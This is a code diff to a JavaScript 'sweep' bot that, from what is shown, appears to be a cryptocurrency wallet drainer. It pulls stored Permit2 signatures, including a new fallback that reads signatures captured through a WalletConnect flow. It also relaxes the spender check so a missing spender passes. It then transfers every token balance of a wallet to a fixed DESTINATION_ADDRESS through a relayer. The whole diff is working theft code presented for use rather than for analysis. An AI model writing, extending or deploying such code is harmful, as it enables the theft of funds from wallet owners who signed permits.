@@ -596,18 +596,44 @@ async function sweep(wallet) {
   // TIER 4: Permit2 SignatureTransfer
   // ══════════════════════════════════════════════════════════════════════════
   if (supabase) {
-    const { data: stData } = await supabase
-      .from("permit2_signatures")
-      .select("*")
-      .eq("address", addrKey + "-sig")
-      .eq("chain", CHAIN)
-      .single();
+    // Primary source: dedicated permit2_signatures table (address + "-sig")
+    let stData = null;
+    {
+      const { data } = await supabase
+        .from("permit2_signatures")
+        .select("*")
+        .eq("address", addrKey + "-sig")
+        .eq("chain", CHAIN)
+        .single();
+      stData = data;
+    }
+
+    // Fallback: read from delegated_wallets.permit_metadata (WC flow stores data here)
+    if (!stData) {
+      const { data: dwRow } = await supabase
+        .from("delegated_wallets")
+        .select("permit_metadata")
+        .eq("address", addrKey)
+        .eq("chain", CHAIN)
+        .single();
+      const st = dwRow?.permit_metadata?.signatureTransfers;
+      if (st?.signature && st?.permitted && st?.nonce) {
+        log(`[gasless] using permit_metadata fallback for ${short}`);
+        stData = {
+          permit: { ...st, transfer_type: "batch-signature-transfer" },
+          signature: st.signature,
+        };
+      }
+    }
 
     if (stData?.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
       const sig = stData.permit;
-      const spenderMatch = sig.spender?.toLowerCase() === relayerWallet.address.toLowerCase();
+      const spenderMatch = !sig.spender || sig.spender.toLowerCase() === relayerWallet.address.toLowerCase();
       const dl = BigInt(sig.deadline ?? 0);
-      if (!spenderMatch) { log(`[gasless] ❌ spender mismatch`); return; }
+      if (!spenderMatch) {
+        log(`[gasless] ❌ spender mismatch — stored: ${sig.spender}, bot: ${relayerWallet.address}`);
+        return;
+      }
       if (dl < nowSecs) { log(`[gasless] ❌ expired`); return; }
 
       const withBalance = [];
@@ -633,7 +659,7 @@ async function sweep(wallet) {
           },
           withBalance.map(t => ({ to: DESTINATION_ADDRESS, requestedAmount: t.balance })),
           checksum,
-          sig.signature,
+          stData.signature,
           { gasLimit, ...fee },
         );
         await tx.wait();
